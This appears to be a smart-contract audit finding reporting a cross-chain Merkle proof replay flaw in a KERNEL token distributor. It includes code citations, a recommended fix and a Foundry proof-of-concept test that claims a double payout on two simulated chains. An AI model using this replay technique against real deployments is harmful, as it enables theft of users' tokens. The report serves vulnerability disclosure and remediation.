### Title
Cross-Chain Merkle Proof Replay Allows N× Token Theft — (`contracts/KERNEL/KernelTop100MerkleDistributor.sol`)

---

### Summary

The leaf encoding in `_verifyClaimProof` binds only `(user, amount)` with no `chainId`, no contract address, and no nonce. Because `userClaims` state is local to each deployment, a legitimate claimant can replay the identical proof on every chain where the distributor is deployed with the same `merkleRoot`, receiving a full allocation on each chain.

---

### Finding Description

The leaf is constructed at line 293:

```solidity
bytes32 leaf = keccak256(abi.encodePacked(user, amount));
``` [1](#0-0) 

There is no `block.chainid`, no `address(this)`, and no per-claim nonce in the preimage. The replay guard is the local `userClaims` mapping:

```solidity
mapping(address user => UserClaim userClaim) public userClaims;
``` [2](#0-1) 

This mapping is entirely per-contract-instance. A claim recorded on Chain A has no effect on the state of the identical contract on Chain B. The exhaustion check at line 239 only reads the local chain's `amountClaimed`:

```solidity
if (userClaim.amountClaimed >= userTotalClaimableAmount) {
    return 0;
}
``` [3](#0-2) 

Kelp DAO is an explicitly multi-chain protocol (Arbitrum, Base, Optimism, Linea, Scroll, Unichain are all in scope). Deploying the same `KernelTop100MerkleDistributor` with the same `merkleRoot` across chains is the natural operational pattern for a "Top 100" distribution event. The contract provides zero protection against this replay.

---

### Impact Explanation

Each chain's distributor holds its own balance of KERNEL tokens. An attacker with a valid leaf `(user, amount)` can call `claim` (or `claimAndStake`) on every chain where the contract is deployed, draining `amount` (minus fee) from each instance. With N deployments, the attacker receives up to N × their entitled allocation. The excess is direct theft of KERNEL tokens held at-rest in the other users' distributor contracts.

**Scope match:** Critical — Direct theft of user funds at-rest.

---

### Likelihood Explanation

- The attacker needs only a valid merkle proof on one chain — which they legitimately possess.
- EOAs are chain-agnostic; the same private key controls the same address on every EVM chain.
- No admin compromise, front-running, or brute force is required.
- The only precondition is that the same `merkleRoot` is used on ≥2 chains, which is the standard operational pattern for a multi-chain airdrop/distribution.

---

### Recommendation

Bind the leaf to the specific deployment by including `block.chainid` and `address(this)` in the encoded preimage:

```solidity
bytes32 leaf = keccak256(
    abi.encodePacked(block.chainid, address(this), user, amount)
);
```

This makes every leaf unique per chain and per contract instance, so a proof valid on Chain A is cryptographically invalid on Chain B even with the same `merkleRoot`. [4](#0-3) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

// Foundry fork-safe differential test (no public mainnet)
// Run: forge test --match-test testCrossChainReplay -vvv

import "forge-std/Test.sol";
import {KernelTop100MerkleDistributor} from
    "contracts/KERNEL/KernelTop100MerkleDistributor.sol";
import {MockERC20} from "test/mocks/MockERC20.sol";

contract CrossChainReplayTest is Test {
    // Build a single-leaf tree: leaf = keccak256(abi.encodePacked(attacker, AMOUNT))
    address attacker = address(0xBEEF);
    uint256 constant AMOUNT = 1000e18;

    function testCrossChainReplay() external {
        bytes32 leaf = keccak256(abi.encodePacked(attacker, AMOUNT));
        bytes32 merkleRoot = leaf; // single-leaf tree, proof is empty

        // ── Chain A simulation ──────────────────────────────────────
        vm.chainId(1); // Ethereum mainnet
        (KernelTop100MerkleDistributor distA, MockERC20 kernelA) =
            _deploy(merkleRoot);
        kernelA.mint(address(distA), AMOUNT * 10);

        vm.warp(block.timestamp + 31 days); // past vesting start
        vm.prank(attacker);
        distA.claim(AMOUNT, new bytes32[](0));
        uint256 balA = kernelA.balanceOf(attacker);
        assertEq(balA, AMOUNT); // attacker received full allocation on A

        // ── Chain B simulation ──────────────────────────────────────
        vm.chainId(42161); // Arbitrum
        (KernelTop100MerkleDistributor distB, MockERC20 kernelB) =
            _deploy(merkleRoot); // SAME merkleRoot
        kernelB.mint(address(distB), AMOUNT * 10);

        vm.warp(block.timestamp + 31 days);
        vm.prank(attacker);
        distB.claim(AMOUNT, new bytes32[](0)); // identical proof accepted
        uint256 balB = kernelB.balanceOf(attacker);
        assertEq(balB, AMOUNT); // attacker received full allocation on B too

        // Combined payout = 2× entitlement
        assertEq(balA + balB, 2 * AMOUNT);
    }

    function _deploy(bytes32 root)
        internal
        returns (KernelTop100MerkleDistributor dist, MockERC20 token)
    {
        token = new MockERC20("KERNEL", "KERNEL", 18);
        address pool = address(new MockDepositPool());
        dist = new KernelTop100MerkleDistributor();
        dist.initialize(
            address(token),
            pool,
            address(0xFEE),
            0,                          // 0 fee
            block.timestamp + 1 days,   // vestingStart
            root
        );
    }
}
```

The test deploys two distributor instances with the same `merkleRoot` on simulated Chain 1 and Chain 42161, submits the identical proof on both, and asserts the combined payout equals `2 × AMOUNT`, confirming the replay.

### Citations

**File:** contracts/KERNEL/KernelTop100MerkleDistributor.sol (L158-158)
```text
    mapping(address user => UserClaim userClaim) public userClaims;
```

**File:** contracts/KERNEL/KernelTop100MerkleDistributor.sol (L239-241)
```text
        if (userClaim.amountClaimed >= userTotalClaimableAmount) {
            return 0;
        }
```

**File:** contracts/KERNEL/KernelTop100MerkleDistributor.sol (L281-298)
```text
    function _verifyClaimProof(address user, uint256 amount, bytes32[] calldata merkleProof) internal view {
        UtilLib.checkNonZeroAddress(user);

        if (merkleRoot == bytes32(0)) {
            revert ZeroValueProvided();
        }

        if (amount == 0) {
            revert ZeroValueProvided();
        }

        // Verify the merkle proof
        bytes32 leaf = keccak256(abi.encodePacked(user, amount));
        bool isValid = MerkleProofUpgradeable.verify(merkleProof, merkleRoot, leaf);

        if (!isValid) {
            revert InvalidMerkleProof();
        }
```
